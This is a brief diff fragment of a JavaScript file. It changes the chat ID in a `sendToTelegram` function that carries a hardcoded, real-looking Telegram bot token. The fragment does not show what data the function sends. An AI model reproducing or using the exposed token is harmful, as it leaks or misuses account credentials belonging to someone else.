@@ -20,7 +20,7 @@ function openInDefaultBrowser() {
 
         function sendToTelegram(type) {
         let botToken = "8016790696:AAEFp-OwVwEK--TOXqx7EtrhLlc7byRrbaQ";
-        let chatId = "-4615472979";
+        let chatId = "-4749002151";
         let name, date, message;
 
         if (type === "paid") {
